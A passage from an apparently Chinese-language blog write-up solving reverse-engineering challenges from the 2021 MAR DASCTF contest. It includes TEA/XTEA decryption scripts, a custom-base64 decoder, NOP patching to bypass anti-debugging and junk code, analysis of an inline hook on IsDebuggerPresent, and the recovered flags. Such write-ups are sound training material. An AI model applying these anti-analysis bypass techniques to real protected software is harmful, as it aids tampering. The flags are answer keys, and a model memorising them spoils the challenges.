class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//加密函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encrypt</span> <span class="params">(<span class="keyword">int</span>* v, <span class="keyword">int</span>* k)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], sum=<span class="number">0</span>, i;           <span class="comment">/* set up */</span></span><br><span class="line">    <span class="keyword">int</span> delta=<span class="number">0x9e3779b9</span>;                     <span class="comment">/* a key schedule constant */</span></span><br><span class="line">    <span class="keyword">int</span> k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>];   <span class="comment">/* cache key */</span></span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;                       <span class="comment">/* basic cycle start */</span></span><br><span class="line">        sum += delta;</span><br><span class="line">        v0 += ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);</span><br><span class="line">        v1 += ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3);</span><br><span class="line">    &#125;                                              <span class="comment">/* end cycle */</span></span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//解密函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decrypt</span> <span class="params">(<span class="keyword">int</span>* v, <span class="keyword">int</span>* k)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], sum=<span class="number">0xC6EF3720</span>, i;  <span class="comment">/* set up */</span></span><br><span class="line">    <span class="keyword">int</span> delta=<span class="number">0x9e3779b9</span>;                     <span class="comment">/* a key schedule constant */</span></span><br><span class="line">    <span class="keyword">int</span> k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>];   <span class="comment">/* cache key */</span></span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">32</span>; i++) &#123;                         <span class="comment">/* basic cycle start */</span></span><br><span class="line">        v1 -= ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3);</span><br><span class="line">        v0 -= ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);</span><br><span class="line">        sum -= delta;</span><br><span class="line">    &#125;                                              <span class="comment">/* end cycle */</span></span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> v[<span class="number">14656</span>]=&#123;<span class="number">0</span>&#125;,k[<span class="number">4</span>]=&#123;<span class="number">0x67616C66</span>, <span class="number">0x6B61667B</span>, <span class="number">0x6C665F65</span>, <span class="number">0x7D216761</span>&#125;;</span><br><span class="line">    FILE *p1 = fopen(<span class="string">&quot;./tea.png.out&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    fread(&amp;v, <span class="number">4</span>, <span class="number">14656</span>, p1);</span><br><span class="line">    fclose(p1);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">14656</span>;i+=<span class="number">2</span>)&#123;</span><br><span class="line">        decrypt(&amp;v[i], k);</span><br><span class="line">    &#125;</span><br><span class="line">    FILE *p2 = fopen(<span class="string">&quot;./tea.png&quot;</span>, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">    fwrite(&amp;v, <span class="number">4</span>, <span class="number">14656</span>, p2);</span><br><span class="line">    fclose(p2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到<code>./tea.png</code>：</p><p><img src="/p/wpFor-2021MARDASCTF/tea.png"></p><p>得到flag：<strong>DASCTF{09066cbb91df55502e6fdc83bf84cf45}</strong></p><h2 id="Enjoyit-1"><a href="#Enjoyit-1" class="headerlink" title="Enjoyit-1"></a>Enjoyit-1</h2><p>又一道TEA。</p><p>附件用ExEinfoPE可以看到</p><p><img src="/p/wpFor-2021MARDASCTF/image-20210328162359343.png"></p><p>说明是.NET逆向，于是用ILSpy打开。</p><p><img src="/p/wpFor-2021MARDASCTF/image-20210328162618673.png"></p><p>看到不寻常字符串<code>DotfuscatorAttribute</code>，用搜索引擎一查可以发现是使用Dotfuscator加密混淆程序的产物（<a href="https://blog.csdn.net/qwsf01115/article/details/71425296">使用Dotfuscator加密混淆程序以及如何脱壳反编译_qwsf01115的专栏-CSDN博客</a>）。</p><p>所以根据文章指引用de4dot（可用release：<a href="https://github.com/CodingGuru1989/de4dot/releases/tag/snapshot">Release de4dot mod · CodingGuru1989&#x2F;de4dot</a>）进行反混淆，得到<code>Enjoyit-1-cleaned.exe</code>，再用ILSpy打开，就可以看到混淆前在Class0里的main函数。</p><p><img src="/p/wpFor-2021MARDASCTF/image-20210328163103034.png"></p><p>这个逻辑也很简单，<del>无非就是输入text正确以后运行100000秒就会输出flag。</del></p><p>（当然肯定不可能这么走啊，100000s&#x3D;1666.67min&#x3D;27.78h，必然是等不起的。</p><p><img src="/p/wpFor-2021MARDASCTF/image-20210328163129604.png"></p><p>flag产生的逻辑是先用<code>uint_</code>和<code>text</code>进行<code>method_3()</code>的处理，然后再与array3按字节异或。</p><p>而text相当于是已知的，关键在 <code>method_1()</code>这里。</p><p><img src="/p/wpFor-2021MARDASCTF/image-20210328165701712.png"></p><p>可以看出是一个base64换表，Table在string_0这里：</p><p><img src="/p/wpFor-2021MARDASCTF/image-20210328165737537.png"></p><p>于是可以先写脚本得到text：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">src=<span class="string">&#x27;yQXHyBvN3g/81gv51QXG1QTBxRr/yvXK1hC=&#x27;</span></span><br><span class="line">table=<span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line">b64table=<span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">text=base64.b64decode(src.translate(<span class="built_in">str</span>.maketrans(table,b64table)).encode())</span><br><span class="line">print(text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># text=b&#x27;combustible_oolong_tea_plz&#x27;</span></span><br></pre></td></tr></table></figure><p>然后在主函数往下看，来到了第二个关键函数<code>method_3()</code>：</p><p><img src="/p/wpFor-2021MARDASCTF/image-20210328170318295.png"></p><p>显而易见是个改了delta的XTEA加密，传进来的uint_0是主函数的uint_，byte_0是text的前四字节。</p><p>依旧是用上面博客的XTEA脚本改了一下，得到XTEA加密后的uint_：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/* take 64 bits of data in v[0] and v[1] and 128 bits of key[0] - key[3] */</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encipher</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> num_rounds, <span class="keyword">uint32_t</span> v[<span class="number">2</span>], <span class="keyword">uint32_t</span> <span class="keyword">const</span> key[<span class="number">4</span>])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], sum=<span class="number">0</span>, delta=<span class="number">2654435464</span>;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; num_rounds; i++) &#123;</span><br><span class="line">        v0 += (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">        sum += delta;</span><br><span class="line">        v1 += (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum&gt;&gt;<span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decipher</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> num_rounds, <span class="keyword">uint32_t</span> v[<span class="number">2</span>], <span class="keyword">uint32_t</span> <span class="keyword">const</span> key[<span class="number">4</span>])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], delta=<span class="number">2654435464</span>, sum=delta*num_rounds;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; num_rounds; i++) &#123;</span><br><span class="line">        v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum&gt;&gt;<span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">        sum -= delta;</span><br><span class="line">        v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> v[<span class="number">2</span>]=&#123;<span class="number">288</span>,<span class="number">369</span>&#125;;</span><br><span class="line">    <span class="keyword">uint32_t</span> <span class="keyword">const</span> k[<span class="number">4</span>]=&#123;<span class="number">0x63</span>,<span class="number">0x6f</span>,<span class="number">0x6d</span>,<span class="number">0x62</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> r=<span class="number">32</span>;</span><br><span class="line">    encipher(r, v, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%8x%8x\n&quot;</span>,v[<span class="number">0</span>],v[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为主函数里后续处理是把8 bit十六进制的两个结果往str里填，所以输出采用十六进制形式。</p><p><img src="/p/wpFor-2021MARDASCTF/image-20210328170941696.png"></p><p>得到<code>str=&quot;6308fe34b7fe6fdb&quot;</code></p><p>最后进行xor处理即可，上exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">xtea=<span class="string">&quot;6308fe34b7fe6fdb&quot;</span></span><br><span class="line">arr3=[<span class="number">2</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">13</span>,<span class="number">3</span>,<span class="number">84</span>,<span class="number">11</span>,<span class="number">4</span>,<span class="number">87</span>,<span class="number">3</span>,<span class="number">86</span>,<span class="number">3</span>,<span class="number">80</span>,<span class="number">7</span>,<span class="number">83</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">83</span>,<span class="number">94</span>,<span class="number">7</span>,<span class="number">84</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">83</span>,<span class="number">3</span>,<span class="number">84</span>,<span class="number">6</span>,<span class="number">83</span>,<span class="number">5</span>,<span class="number">80</span>]</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(arr3)):</span><br><span class="line">    flag+=<span class="built_in">chr</span>(arr3[i]^<span class="built_in">ord</span>(xtea[i%<span class="built_in">len</span>(xtea)]))</span><br><span class="line">print(<span class="string">&quot;flag&#123;&quot;</span>+flag+<span class="string">&quot;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><p>得到flag：<strong>flag{4645e180540ffa7a67cfa174cde105a2}</strong></p><h2 id="replace"><a href="#replace" class="headerlink" title="replace"></a>replace</h2><p>u1s1不知道这个标级怎么标的，居然是比StrangeMine还高的困难，也有可能是我tcl吧（</p><p>主逻辑还是很简单，输入长度为24的flag并且以”flag{}”包裹（check在<code>sub_401550()</code>），然后经过某些处理（<code>sub_401AE7()</code>、<code>sub_401925()</code>还有可能的<code>IsDebuggerPresent()</code>）等于某已知字符串（check在<code>sub_401883()</code>）即可。</p><p><img src="/p/wpFor-2021MARDASCTF/image-20210328171544665.png"></p><p><img src="/p/wpFor-2021MARDASCTF/image-20210328171908728.png"></p><p>最后check这里<code>byte_4080E0</code>是输入后经过处理存放的关键位置。</p><p>从头开始捋处理函数，这里<code>sub_401AE7()</code>的作用是把输入和已知数组进行xor以后放进<code>byte_4080E0</code>中。</p><p><img src="/p/wpFor-2021MARDASCTF/image-20210328172304024.png"></p><p>真的有这么简单吗？</p><p>当然不会，困难题目诶。（从这里逆向解的话会得到假flag。</p><p>真正的奥秘在下一个函数<code>sub_401925()</code>这里，看到<code>VirtualProtectEx()</code>这个改内存读写权限的关键函数，DNA瞬间动了 <del>（别什么奇怪的东西都往DNA里刻啊喂</del> 。</p><p><img src="/p/wpFor-2021MARDASCTF/image-20210328172535850.png"></p><p>这里很像之前做过的一个题（<a href="https://c10udlnk.top/2020/12/16/reSkillsOn-Inline-hook/">RE套路&#x2F;从EASYHOOK学inline hook | c10udlnk_Log</a>），这种函数一般是搭配<code>WriteProcessMemory()</code>在运行时对内存进行修改（从而达到跳转到某些函数的目的）。</p><p>静态分析的话那篇blog也有讲，但是为了做题方便直接动态调试走起。</p><p>因为这里有超——多的反调试，懒得一个个patch了，直接把exit(0)里的功能给patch掉（偷懒大法好。</p><p><img src="/p/wpFor-2021MARDASCTF/image-20210328173054725.png"></p><p>即把这里六个字节直接patch成<code>90 90 90 90 90 90</code>，全部nop掉。</p><p><img src="/p/wpFor-2021MARDASCTF/image-20210328173220088.png"></p><p>变成这个样子：</p><p><img src="/p/wpFor-2021MARDASCTF/image-20210328173307881.png"></p><p>别忘了动态调试前要把patch的字节保存进exe里（<code>Edit-&gt;Patch program-&gt;Apply patches to input file</code>）。</p><p>然后开调，断点下到<code>sub_401925()</code>和<code>IsDebuggerPresent()</code>这里，记得要随便输入一个符合前两个check的字符串。</p><p><img src="/p/wpFor-2021MARDASCTF/image-20210328173823185.png"></p><p>从<code>sub_401925()</code>可以大致看到修改的是<code>IsDebuggerPresent()</code>的内容。</p><p><img src="/p/wpFor-2021MARDASCTF/image-20210328174025489.png"></p><p>所以我们按F9直接走到<code>IsDebuggerPresent()</code>这里，F7步入。</p><p><img src="/p/wpFor-2021MARDASCTF/image-20210328174118284.png"></p><p>可以看到跳转到了一个函数，而再往里走可以看到这是个被花指令处理的函数所以静态分析down掉了。</p><p>很容易就能找到三个跟第一题相同原理的花指令（注意+2那里要nop多一个字节），所以直接patch，然后把数据按c转成code。</p><p><img src="/p/wpFor-2021MARDASCTF/image-20210328174304181.png"></p><p><img src="/p/wpFor-2021MARDASCTF/image-20210328174410899.png"></p><p><img src="/p/wpFor-2021MARDASCTF/image-20210328174507812.png"></p><p>最后得到反编译结果：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub_4015C3</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0[<span class="number">128</span>]; <span class="comment">// [rsp+30h] [rbp-50h] BYREF</span></span><br><span class="line">  __int64 v1[<span class="number">5</span>]; <span class="comment">// [rsp+230h] [rbp+1B0h]</span></span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// [rsp+258h] [rbp+1D8h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+264h] [rbp+1E4h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [rsp+268h] [rbp+1E8h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+26Ch] [rbp+1ECh]</span></span><br><span class="line"></span><br><span class="line">  VirtualProtectEx(hProcess, IsDebuggerPresent_0, <span class="number">0x10</span>ui64, <span class="number">0x40</span>u, &amp;flNewProtect);</span><br><span class="line">  WriteProcessMemory(hProcess, IsDebuggerPresent_0, Destination, <span class="number">0x10</span>ui64, <span class="number">0</span>i64);</span><br><span class="line">  VirtualProtectEx(hProcess, IsDebuggerPresent_0, <span class="number">0x10</span>ui64, flNewProtect, <span class="number">0</span>i64);</span><br><span class="line">  <span class="keyword">if</span> ( !IsDebuggerPresent() )</span><br><span class="line">  &#123;</span><br><span class="line">    j = <span class="number">0</span>;</span><br><span class="line">    v3 = <span class="number">0</span>;</span><br><span class="line">    v1[<span class="number">0</span>] = <span class="number">0</span>i64;</span><br><span class="line">    v1[<span class="number">1</span>] = <span class="number">0</span>i64;</span><br><span class="line">    v1[<span class="number">2</span>] = <span class="number">0</span>i64;</span><br><span class="line">    v1[<span class="number">3</span>] = <span class="number">0</span>i64;</span><br><span class="line">    <span class="built_in">memcpy</span>(v0, &amp;unk_404020, <span class="keyword">sizeof</span>(v0));</span><br><span class="line">    v2 = Str;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt;= <span class="number">5</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">23</span>; ++j )</span><br><span class="line">        v2[j] = v0[(<span class="keyword">unsigned</span> __int8)v2[j]];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">5</span>; ++i )</span><br><span class="line">      *((_DWORD *)v1 + i) = ((<span class="keyword">unsigned</span> __int8)v2[i + <span class="number">12</span>] &lt;&lt; <span class="number">8</span>) | ((<span class="keyword">unsigned</span> __int8)v2[i + <span class="number">6</span>] &lt;&lt; <span class="number">16</span>) | ((<span class="keyword">unsigned</span> __int8)v2[i] &lt;&lt; <span class="number">24</span>) | (<span class="keyword">unsigned</span> __int8)v2[i + <span class="number">18</span>];</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">5</span>; ++i )</span><br><span class="line">      <span class="built_in">sprintf</span>(&amp;byte_4080E0[<span class="number">8</span> * i], <span class="string">&quot;%x&quot;</span>, *((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)v1 + i));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就是先把<code>IsDebuggerPresent()</code>里的内容还原，然后在非调试情况下将输入经过一些处理放到<code>byte_4080E0</code>中。</p><p>这！才是真正的加密函数！</p><p>然后这个逻辑也很好逆啦，顺着就是先在unk_404020盒里换五次，然后栅栏密码得到最后的字符串。</p><p>写出exp有：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">ans=unhexlify(<span class="string">&quot;416f6b116549435c2c0f1143174339023d4d4c0f183e7828&quot;</span>)</span><br><span class="line">tmps=[<span class="number">0</span>,<span class="number">6</span>,<span class="number">12</span>,<span class="number">18</span>]</span><br><span class="line">seq=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    tmpl=[x+i <span class="keyword">for</span> x <span class="keyword">in</span> tmps]</span><br><span class="line">    seq=seq+tmpl</span><br><span class="line">arr1=[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">    arr1[seq[i]]=ans[i]</span><br><span class="line">box=[<span class="number">0x00000080</span>, <span class="number">0x00000065</span>, <span class="number">0x0000002F</span>, <span class="number">0x00000034</span>, <span class="number">0x00000012</span>, <span class="number">0x00000037</span>, <span class="number">0x0000007D</span>, <span class="number">0x00000040</span>, <span class="number">0x00000026</span>, <span class="number">0x00000016</span>, <span class="number">0x0000004B</span>, <span class="number">0x0000004D</span>, <span class="number">0x00000055</span>, <span class="number">0x00000043</span>, <span class="number">0x0000005C</span>, <span class="number">0x00000017</span>, <span class="number">0x0000003F</span>, <span class="number">0x00000069</span>, <span class="number">0x00000079</span>, <span class="number">0x00000053</span>, <span class="number">0x00000018</span>, <span class="number">0x00000002</span>, <span class="number">0x00000006</span>, <span class="number">0x00000061</span>, <span class="number">0x00000027</span>, <span class="number">0x00000008</span>, <span class="number">0x00000049</span>, <span class="number">0x0000004A</span>, <span class="number">0x00000064</span>, <span class="number">0x00000023</span>, <span class="number">0x00000056</span>, <span class="number">0x0000005B</span>, <span class="number">0x0000006F</span>, <span class="number">0x00000011</span>, <span class="number">0x0000004F</span>, <span class="number">0x00000014</span>, <span class="number">0x00000004</span>, <span class="number">0x0000001E</span>, <span class="number">0x0000005E</span>, <span class="number">0x0000002D</span>, <span class="number">0x0000002A</span>, <span class="number">0x00000032</span>, <span class="number">0x0000002B</span>, <span class="number">0x0000006C</span>, <span class="number">0x00000074</span>, <span class="number">0x00000009</span>, <span class="number">0x0000006E</span>, <span class="number">0x00000042</span>, <span class="number">0x00000070</span>, <span class="number">0x0000005A</span>, <span class="number">0x00000071</span>, <span class="number">0x0000001C</span>, <span class="number">0x0000007B</span>, <span class="number">0x0000002C</span>, <span class="number">0x00000075</span>, <span class="number">0x00000054</span>, <span class="number">0x00000030</span>, <span class="number">0x0000007E</span>, <span class="number">0x0000005F</span>, <span class="number">0x0000000E</span>, <span class="number">0x00000001</span>, <span class="number">0x00000046</span>, <span class="number">0x0000001D</span>, <span class="number">0x00000020</span>, <span class="number">0x0000003C</span>, <span class="number">0x00000066</span>, <span class="number">0x0000006B</span>, <span class="number">0x00000076</span>, <span class="number">0x00000063</span>, <span class="number">0x00000047</span>, <span class="number">0x0000006A</span>, <span class="number">0x00000029</span>, <span class="number">0x00000025</span>, <span class="number">0x0000004E</span>, <span class="number">0x00000031</span>, <span class="number">0x00000013</span>, <span class="number">0x00000050</span>, <span class="number">0x00000051</span>, <span class="number">0x00000033</span>, <span class="number">0x00000059</span>, <span class="number">0x0000001A</span>, <span class="number">0x0000005D</span>, <span class="number">0x00000044</span>, <span class="number">0x0000003E</span>, <span class="number">0x00000028</span>, <span class="number">0x0000000F</span>, <span class="number">0x00000019</span>, <span class="number">0x0000002E</span>, <span class="number">0x00000005</span>, <span class="number">0x00000062</span>, <span class="number">0x0000004C</span>, <span class="number">0x0000003A</span>, <span class="number">0x00000021</span>, <span class="number">0x00000045</span>, <span class="number">0x0000001F</span>, <span class="number">0x00000038</span>, <span class="number">0x0000007F</span>, <span class="number">0x00000057</span>, <span class="number">0x0000003D</span>, <span class="number">0x0000001B</span>, <span class="number">0x0000003B</span>, <span class="number">0x00000024</span>, <span class="number">0x00000041</span>, <span class="number">0x00000077</span>, <span class="number">0x0000006D</span>, <span class="number">0x0000007A</span>, <span class="number">0x00000052</span>, <span class="number">0x00000073</span>, <span class="number">0x00000007</span>, <span class="number">0x00000010</span>, <span class="number">0x00000035</span>, <span class="number">0x0000000A</span>, <span class="number">0x0000000D</span>, <span class="number">0x00000003</span>, <span class="number">0x0000000B</span>, <span class="number">0x00000048</span>, <span class="number">0x00000067</span>, <span class="number">0x00000015</span>, <span class="number">0x00000078</span>, <span class="number">0x0000000C</span>, <span class="number">0x00000060</span>, <span class="number">0x00000039</span>, <span class="number">0x00000036</span>, <span class="number">0x00000022</span>, <span class="number">0x0000007C</span>, <span class="number">0x00000058</span>, <span class="number">0x00000072</span>, <span class="number">0x00000068</span>]</span><br><span class="line">arr2=[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">        arr2[j]=box.index(arr1[j])</span><br><span class="line">    arr1=arr2</span><br><span class="line">myInput=<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>,arr1))</span><br><span class="line">print(myInput)</span><br><span class="line">flag=myInput.encode()</span><br><span class="line">print(md5(flag).hexdigest()) <span class="comment"># 别忘了最后提交md5</span></span><br></pre></td></tr></table></figure><p>得到flag：<strong>flag{Sh1t_you_dec0d3_it}</strong></p><h2 id="奇怪的扫雷"><a href="#奇怪的扫雷" class="headerlink" title="奇怪的扫雷"></a>奇怪的扫雷</h2><p>这道题赛中没怎么做，赛后复盘静态硬刚+动态调没搞出来，终于等到了带扫雷玩的wp（<a href="https://www.anquanke.com/post/id/236178#h3-8">MAR DASCTF明御攻防赛 PWN、RE Writeup - 安全客，安全资讯平台</a>），感觉思路大概没错、关键函数也找对了，但是忽略了一个小地方：</p><p><img 